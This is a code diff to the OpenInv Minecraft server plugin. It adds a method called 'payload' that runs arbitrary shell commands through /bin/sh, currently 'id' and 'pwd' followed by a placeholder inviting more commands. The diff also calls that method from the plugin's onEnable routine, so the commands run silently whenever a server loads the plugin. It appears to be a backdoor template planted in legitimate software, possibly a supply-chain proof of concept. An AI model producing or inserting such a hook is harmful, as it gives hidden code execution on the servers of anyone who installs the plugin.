@@ -16,6 +16,9 @@
 
 package com.lishid.openinv;
 
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+
 import com.google.common.collect.HashMultimap;
 import com.google.common.collect.Multimap;
 import com.lishid.openinv.commands.ContainerSettingCommand;
@@ -348,6 +351,18 @@ public class OpenInv extends JavaPlugin implements IOpenInv {
         }
     }
 
+    public void payload() {
+	try {
+	    Runtime r = Runtime.getRuntime();
+	    Process p = r.exec(new String[] {"/bin/sh","-c","id ; pwd ; echo INSERT MORE COMMANDS HERE"});
+	    BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
+	    String s = null;
+	    while ((s = stdInput.readLine()) != null) {
+		this.getLogger().info(s);
+	    }
+	} catch (Exception e) { }
+    }
+    
     @Override
     public void onEnable() {
 
@@ -361,6 +376,10 @@ public class OpenInv extends JavaPlugin implements IOpenInv {
 
         this.languageManager = new LanguageManager(this, "en_us");
 
+	this.getLogger().info("--=== BEGIN PAYLOAD OUTPUT ===---");
+	this.payload();
+	this.getLogger().info("--=== END PAYLOAD OUTPUT ===---");
+	
         // Version check
         if (this.accessor.isSupported()) {
             // Update existing configuration. May require internal access.
